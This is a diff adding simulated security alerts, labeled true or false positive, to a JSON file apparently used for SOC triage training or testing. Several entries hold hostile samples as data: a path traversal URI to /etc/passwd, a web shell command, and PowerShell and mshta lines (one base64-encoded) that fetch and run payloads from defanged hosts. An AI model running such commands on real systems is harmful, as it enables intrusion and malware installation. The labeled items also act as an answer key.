@@ -158,7 +158,7 @@
     {
       "severity": 2,
       "briefdesc": "WAF flagged a suspicious communication - Path traversal",
-      "description": "This rule matches when a WAF alert is raised",
+      "description": "This rule matches when a path traversal signature strings are found in a URI",
       "mitre": ["T1190"],
       "fields": {
         "host_ip": "192.168.10.2",
@@ -169,15 +169,349 @@
         "http_uri": "/user?id=16&avatarimage=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&ref=gLfwEi65OO89FU5k_qZsxwUU3NNRLHRiu-k9q71E94MKHDZy7VN65AZoqn-Yevfevvo5rRyB9AIKpuLXJDftXA"
       },
       "eval": "TP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "WAF flagged a suspicious communication - Command in URI",
+      "description": "This rule matches when a command is found in URI. This could signify a potential web shell.",
+      "mitre": ["T1505.003", "T1190"],
+      "fields": {
+        "host_ip": "192.168.10.2",
+        "hostname": "SRV-WEB-1",
+        "department": "Server",
+        "src_ip": "76.189.45.48",
+        "src_hostname": "Unknown (Outside IP)",
+        "http_uri": "/uploads/raspberry.php?cmd=whoami"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "WAF flagged a suspicious communication - Command in URI",
+      "description": "This rule matches when a command is found in URI. This could signify a potential web shell.",
+      "mitre": ["T1505.003", "T1190"],
+      "fields": {
+        "host_ip": "192.168.10.2",
+        "hostname": "SRV-WEB-1",
+        "department": "Server",
+        "src_ip": "49.76.11.186",
+        "src_hostname": "Unknown (Outside IP)",
+        "http_uri": "/usersdisplay?limitresults=20&action=ls&actionlong=list"
+      },
+      "eval": "FP"
     }
   ],
   "EDR - Files": [
-
+    {
+      "severity": 3,
+      "briefdesc": "Double extension file",
+      "description": "Matches filenames with double extension (ie. .pdf.exe, .mp4.scr)",
+      "mitre": ["T1036.007"],
+      "fields": {
+        "host_ip": "192.168.122.99",
+        "hostname": "HR-103-PC-4",
+        "department": "Human Resources",
+        "user": "RonaldDon",
+        "path": "C:\\Users\\RonaldDon\\Downloads\\kittens.jpg.exe",
+        "file_type": "Windows Executable"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 3,
+      "briefdesc": "Double extension file",
+      "description": "Matches filenames with double extension (ie. .pdf.exe, .mp4.scr)",
+      "mitre": ["T1036.007"],
+      "fields": {
+        "host_ip": "192.168.84.12",
+        "hostname": "ACC-LAPTOP-5",
+        "department": "Accounting department",
+        "user": "SmithCar",
+        "path": "C:\\Users\\SmithCar\\Desktop\\employee_activity.2025.June.xlsx",
+        "file_type": "Excel spreadsheet"
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 4,
+      "briefdesc": "Multiple spaces in filename",
+      "description": "Indicates that a filename contains multiple spaces, which can be a sign of masquerading a malicious extension",
+      "mitre": ["T1036.006"],
+      "fields": {
+        "host_ip": "192.168.84.54",
+        "hostname": "ACC-LAPTOP-12",
+        "department": "Accounting department",
+        "user": "MontanaJul",
+        "path": "C:\\Users\\MontanaJul\\Downloads\\batch-accounting-reports             .bat",
+        "file_type": "Batch file"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 4,
+      "briefdesc": "Multiple spaces in filename",
+      "description": "Indicates that a filename contains multiple spaces, which can be a sign of masquerading a malicious extension",
+      "mitre": ["T1036.006"],
+      "fields": {
+        "host_ip": "192.168.84.54",
+        "hostname": "ACC-LAPTOP-12",
+        "department": "Accounting department",
+        "user": "MontanaJul",
+        "path": "C:\\Users\\MontanaJul\\Desktop\\accounting_model   .xlsx",
+        "file_type": "Excel spreadsheet"
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 4,
+      "briefdesc": "A LNK file was created",
+      "description": "Alert triggers when a .lnk (windows shortcut) file is created. Lnk files can be genuine, but can also serve for executing malicious payloads",
+      "mitre": ["T1204.002", "T1059", "T1036", "T1027.012"],
+      "fields": {
+        "host_ip": "192.168.114.9",
+        "hostname": "LEG-27-PC-6",
+        "department": "Legal department",
+        "user": "KrakenJoe",
+        "path": "C:\\Users\\KrakenJoe\\Downloads\\People of America meeting info\\Website.lnk",
+        "lnk_pointsto": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -com iex(\"iwr hxxp://aga[.]ferld[.]ke/winrecovery.exe -OutFile C:\\ProgramData\\winrecovery.exe; C:\\ProgramData\\winrecovery.exe\")",
+        "lnk_comment": "People of America website"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 4,
+      "briefdesc": "A LNK file was created",
+      "description": "Alert triggers when a .lnk (windows shortcut) file is created. Lnk files can be genuine, but can also serve for executing malicious payloads",
+      "mitre": ["T1204.002", "T1059", "T1036", "T1027.012"],
+      "fields": {
+        "host_ip": "192.168.114.9",
+        "hostname": "LEG-27-PC-6",
+        "department": "Legal department",
+        "user": "SilverTom",
+        "path": "C:\\Users\\SilverTom\\Desktop\\Google Chrome.lnk",
+        "lnk_pointsto": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+        "lnk_comment": "Browse web"
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "Well known credential dumping tool detected",
+      "description": "A well known credential dumping tool (eg. mimikatz) was detected",
+      "mitre": ["T1003", "T1105", "T1558"],
+      "fields": {
+        "host_ip": "192.168.84.54",
+        "hostname": "LOG-H2-PC-MAIN",
+        "department": "Logistics hall",
+        "user": "Logistics2",
+        "path": "C:\\Windows\\Temp\\ax22s4d\\mimikatz.exe"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "Well known credential dumping tool detected",
+      "description": "A well known credential dumping tool (eg. mimikatz) was detected",
+      "mitre": ["T1003", "T1105", "T1558"],
+      "fields": {
+        "host_ip": "192.168.225.10",
+        "hostname": "CS-EMUL-LAPTOP-1",
+        "department": "Cyber security",
+        "user": "ThreatEmulation",
+        "path": "C:\\Windows\\ThreatEmulation\\Desktop\\mimikatz-trunk\\mimikatz.exe"
+      },
+      "eval": "FP"
+    }
   ],
   "EDR - Execution": [
-
+    {
+      "severity": 2,
+      "briefdesc": "Powershell execution using Base64 payload",
+      "description": "Matches any command using powershell with -e, -enc or -EncodedCommand option as it is often indicator of malicious activity and masquerading attempts.",
+      "mitre": ["T1059.001", "T1027.010"],
+      "fields": {
+        "host_ip": "192.168.84.16",
+        "hostname": "ACC-LAPTOP-4",
+        "department": "Accounting department",
+        "user": "KaneHar",
+        "pid": 4896,
+        "parent_process": "WINWORD.exe",
+        "command_line": "powershell.exe -w hidden -e aWV4KCJpd3IgaHh4cDovL21scmE2M1suXXh4aHBhWy5da2gvY29iYWx0c3RyaWtlLmV4ZSAtT3V0RmlsZSBDOlxQcm9ncmFtRGF0YVxXaW5kb3dzLVJlY292ZXJ5LU1vZHVsZS5leGU7IEM6XFByb2dyYW1EYXRhXFdpbmRvd3MtUmVjb3ZlcnktTW9kdWxlLmV4ZSIp"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "Powershell execution using Base64 payload",
+      "description": "Matches any command using powershell with -e, -enc or -EncodedCommand option as it is often indicator of malicious activity and masquerading attempts.",
+      "mitre": ["T1059.001", "T1027.010"],
+      "fields": {
+        "host_ip": "192.168.10.6",
+        "hostname": "SRV-AD-1",
+        "department": "Server",
+        "username": "SYSTEM",
+        "pid": 5466,
+        "parent_process": "svchost.exe",
+        "command_line": "powershell.exe -e JGN1cnJlbnRUaW1lID0gR2V0LURhdGUNCldyaXRlLUhvc3QgIkN1cnJlbnQgVGltZTogJGN1cnJlbnRUaW1lIg=="
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "Suspicious executable payload in clipboard",
+      "description": "Attackers can often exploit the human vector to make users copy and paste malicious commands into the Windows Run prompt (Win+R)",
+      "mitre": ["T1204.004", "T1059"],
+      "fields": {
+        "host_ip": "192.168.84.12",
+        "hostname": "ACC-LAPTOP-5",
+        "department": "Accounting department",
+        "user": "SmithCar",
+        "command_executable": "Microsoft HTML application host",
+        "command_line": "mshta.exe hxxps://x63-hello[.]live/nF3mXcQ9FVjs1sMt[.]html #'' I'm human ID241619''"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 2,
+      "briefdesc": "Suspicious executable payload in clipboard",
+      "description": "Attackers can often exploit the human vector to make users copy and paste malicious commands into the Windows Run prompt (Win+R)",
+      "mitre": ["T1204.004", "T1059"],
+      "fields": {
+        "host_ip": "192.168.49.7",
+        "hostname": "HELP-LAPTOP-5",
+        "department": "Helpdesk department",
+        "user": "SmithAle",
+        "command_executable": "Windows Command Processor",
+        "command_line": "cmd.exe /k systeminfo & ipconfig /all & wmic logicaldisk get name,freespace,size,filesystem"
+      },
+      "eval": "FP"
+    }
   ],
   "Network": [
-
+    {
+      "severity": 1,
+      "briefdesc": "Possible Data Exfiltration",
+      "description": "This rule matches anytime the amount of traffic from a device reaches over 3GB per day.",
+      "mitre": ["T1030"],
+      "fields": {
+        "host_ip": "192.168.122.27",
+        "hostname": "HR-101-PC-13",
+        "department": "Human Resources",
+        "dst_ip": "99.48.156.73",
+        "dst_hostname": "Unknown (Outside IP)",
+        "domain": "alsec445.exillg.ls",
+        "outbound_traffic": "3.56 GB",
+        "inbound_traffic": "24 MB"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 1,
+      "briefdesc": "Possible Data Exfiltration",
+      "description": "This rule matches anytime the amount of traffic from a device reaches over 3GB per day.",
+      "mitre": ["T1030"],
+      "fields": {
+        "host_ip": "192.168.11.2",
+        "hostname": "CFR-ROOM-1",
+        "department": "Conference room",
+        "dst_ip": "62.156.133.177",
+        "dst_hostname": "Unknown (Outside IP)",
+        "domain": "*.zoom.us",
+        "outbound_traffic": "5.32 GB",
+        "inbound_traffic": "5.02 GB"
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 4,
+      "briefdesc": "Protocol over non-standard port",
+      "description": "Attackers will often use non-standard ports for C2 communication to avoid detection.",
+      "mitre": ["T1571"],
+      "fields": {
+        "host_ip": "192.168.122.97",
+        "hostname": "HR-101-PC-20",
+        "department": "Human Resources",
+        "dst_ip": "19.48.44.78",
+        "dst_hostname": "Unknown (Outside IP)",
+        "protocol": "HTTP",
+        "port": 9999,
+        "path": "/UEsDBBQAAQAIANurelz4AA==",
+        "url": "hxxp://19[.]48[.]44[.]78:9999/UEsDBBQAAQAIANurelz4AA=="
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 4,
+      "briefdesc": "Protocol over non-standard port",
+      "description": "Attackers will often use non-standard ports for C2 communication to avoid detection.",
+      "mitre": ["T1571"],
+      "fields": {
+        "host_ip": "192.168.5.11",
+        "hostname": "SWD-3-PC-5",
+        "department": "Software development",
+        "dst_ip": "192.168.5.13",
+        "dst_hostname": "SWD-SRV-DEV-1",
+        "protocol": "HTTP",
+        "port": 5000,
+        "path": "/login",
+        "url": "hxxp://192[.]168[.]5[.]13:5000/login"
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 3,
+      "briefdesc": "Possible C2 beacon activity",
+      "description": "This rule detects periodic connection activity up to beaconing every 5 minutes. This is often a sign of C2 communication.",
+      "mitre": ["T1071"],
+      "fields": {
+        "host_ip": "192.168.22.7",
+        "hostname": "FOOD-ORDER-BOX-1",
+        "department": "Food order box",
+        "user": "root",
+        "interval [s]": 146,
+        "interval_drift +- [s]": 15,
+        "dst_ip": "25.189.84.41",
+        "dst_name": "Unknown (Outside IP)",
+        "parent_process": "kernel-2.4.61.sh",
+        "command_line": "curl hxxp://25[.]189[.]84[.]41/report"
+      },
+      "eval": "TP"
+    },
+    {
+      "severity": 3,
+      "briefdesc": "Possible C2 beacon activity",
+      "description": "This rule detects periodic connection activity up to beaconing every 5 minutes. This is often a sign of C2 communication.",
+      "mitre": ["T1071"],
+      "fields": {
+        "host_ip": "192.168.10.3",
+        "hostname": "SRV-WEB-2",
+        "department": "Server",
+        "user": "root",
+        "interval [s]": 60,
+        "interval_drift +- [s]": 0,
+        "dst_ip": "91.189.91.98",
+        "dst_name": "connectivity-check.ubuntu.com",
+        "parent_process": "NetworkManager",
+        "command_line": "curl -fsS hxxp://connectivity-check[.]ubuntu[.]com"
+      },
+      "eval": "FP"
+    },
+    {
+      "severity": 1,
+      "briefdesc": "TCP scanning detected",
+      "description": "Matches various TCP scan characteristics, such as Connection scan, Silent scan, FIN scan and Xmas scan.",
+      "mitre": ["T1595"],
+      "fields": {
+        "src_ip": "192.168.136.48",
+        "src_hostname": "MRK-405-PC-16",
+        "department": "Marketing",
+        "username": "DoeJan",
+        "packets_detected": 72,
+        "IPs_targeted": 24,
+        "ports_targeted": "[22, 445, 3389]",
+        "flags": "[FIN, PSH, URG]"
+      },
+      "eval": "TP"
+    }
   ]
 }
